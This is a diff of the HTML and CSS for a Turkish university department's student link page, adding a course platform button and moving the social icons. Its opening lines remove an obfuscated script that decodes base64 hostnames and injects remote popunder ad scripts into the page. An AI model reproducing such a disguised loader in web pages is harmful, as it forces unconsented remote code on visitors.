@@ -1,38 +1,29 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
-    <script type="text/javascript" data-cfasync="false">
-/*<![CDATA[/* */
-(function(){var y=window,n="ca103ea8fee77c5687b953f528f40321",g=[["siteId",374-417-615+5169295],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],s=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL21kYXRlcGFpci5taW4uY3Nz","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvS0Evb2llOC5qcw=="],d=-1,r,u,f=function(){clearTimeout(u);d++;if(s[d]&&!(1763497733000<(new Date).getTime()&&1<d)){r=y.document.createElement("script");r.type="text/javascript";r.async=!0;var j=y.document.getElementsByTagName("script")[0];r.src="https://"+atob(s[d]);r.crossOrigin="anonymous";r.onerror=f;r.onload=function(){clearTimeout(u);y[n.slice(0,16)+n.slice(0,16)]||f()};u=setTimeout(f,5E3);j.parentNode.insertBefore(r,j)}};if(!y[n]){try{Object.freeze(y[n]=g)}catch(e){}f()}})();
-/*]]>/* */
-</script>
-
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anadolu Edu</title>
+    <title>Anadolu Üniversitesi</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
         html, body {
             margin: 0;
             padding: 0;
             width: 100%;
-            height: 100%;
-            overflow: hidden;
+            height: auto; /* Sayfanın kaymasını aç */
+            overflow-x: hidden; /* Yatay kaydırmayı kapat */
+            overflow-y: auto;   /* Dikey kaydırmayı aç */
             font-family: 'Roboto', sans-serif;
-        }
-
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            background-color: #fff4f4; /* Açık kırmızı arka plan */
-            color: #4a0000; /* Koyu kırmızı metin */
+            background-color: #fff4f4;
+            color: #4a0000;
+            text-align: center;
         }
 
         .header {
-            text-align: center;
-            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 20px 0;
         }
 
         .header img {
@@ -43,15 +34,38 @@
         .header p {
             font-size: 22px;
             font-weight: bold;
-            color: #a10000; /* Koyu kırmızı */
+            color: #a10000;
             margin-top: 10px;
+        }
+
+        .social-container {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+        }
+
+        .social-logo {
+            width: 50px;
+            height: 50px;
+            background-size: cover;
+            display: inline-block;
+        }
+
+        .instagram {
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png');
+        }
+
+        .whatsapp {
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg');
         }
 
         .button-container {
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 20px;
+            gap: 15px;
+            margin-top: 20px;
         }
 
         button {
@@ -64,7 +78,6 @@
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             transition: all 0.3s ease;
         }
 
@@ -73,23 +86,11 @@
             transform: translateY(-3px);
         }
 
-        .social-logo {
-            position: fixed;
-            width: 50px;
-            height: 50px;
-            background-size: cover;
-        }
-
-        .instagram {
-            bottom: 20px;
-            left: 20px;
-            background-image: url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png');
-        }
-
-        .whatsapp {
-            bottom: 20px;
-            right: 20px;
-            background-image: url('https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg');
+        .info-text {
+            font-size: 16px;
+            font-weight: bold;
+            color: #4a0000;
+            margin-top: -10px;
         }
 
         .modal {
@@ -97,10 +98,10 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: #ffd6d6; /* Açık kırmızı */
-            color: #4a0000; /* Koyu kırmızı yazı */
+            background: #ffd6d6;
+            color: #4a0000;
             padding: 20px;
-            border: 2px solid #a10000; /* Koyu kırmızı çerçeve */
+            border: 2px solid #a10000;
             border-radius: 10px;
             text-align: center;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
@@ -117,7 +118,6 @@
 
         .modal p {
             font-size: 18px;
-            margin: 5px 0;
             font-weight: 600;
         }
 
@@ -131,14 +131,12 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
         }
 
         .modal button:hover {
             background-color: #b71c1c;
         }
 
-        /* Arka plan bulanıklığı */
         .backdrop {
             position: fixed;
             top: 0;
@@ -152,9 +150,16 @@
     </style>
 </head>
 <body>
+
     <div class="header">
         <img src="https://www.anadolu.edu.tr/uploads/anadolu/ckfinder/web/files/T%C3%9CRK%C3%87E%20LOGOLAR%20Anadolu%20%C3%9Cniversitesi-01(1).png" alt="Anadolu Üniversitesi Logosu">
         <p>Halkla İlişkiler ve Reklamcılık</p>
+        
+        <!-- Instagram ve WhatsApp Butonları -->
+        <div class="social-container">
+            <a href="https://www.instagram.com/aof_halklailiskilerreklamcilik/" target="_blank" class="social-logo instagram"></a>
+            <a href="https://chat.whatsapp.com/HxUm7sZkBkxAomZFu1tHU8" target="_blank" class="social-logo whatsapp"></a>
+        </div>
     </div>
 
     <div class="button-container">
@@ -162,10 +167,9 @@
         <button onclick="navigateTo('https://aosogrenci.anadolu.edu.tr/')">ÖBS - Öğrenci Bilgi Sistemi</button>
         <button onclick="navigateTo('https://bendeberkay.blogspot.com/2024/11/aofHalklaIliskiler.html?m=1')">Bölümümüz - Bilgilendirme</button>
         <button onclick="navigateTo('https://berkay344.github.io/hesap/')">Not Hesaplayıcı Vize & Final</button>
+        <button onclick="navigateTo('https://ddp.anadolu.edu.tr')">Dijital Ders Platformu</button>
+        <p class="info-text">Dijital Ders Platformu, E-Kampüs'e benzer bir sistemdir. Sınıf fark etmeksizin tüm dersleri seçerek materyallerine ulaşabilirsiniz.</p>
     </div>
-
-    <a href="https://www.instagram.com/aof_halklailiskilerreklamcilik/" target="_blank" class="social-logo instagram"></a>
-    <a href="https://chat.whatsapp.com/HxUm7sZkBkxAomZFu1tHU8" target="_blank" class="social-logo whatsapp"></a>
 
     <div id="backdrop" class="backdrop"></div>
 
@@ -195,5 +199,6 @@
             setTimeout(showModal, 3000);
         };
     </script>
+
 </body>
 </html>
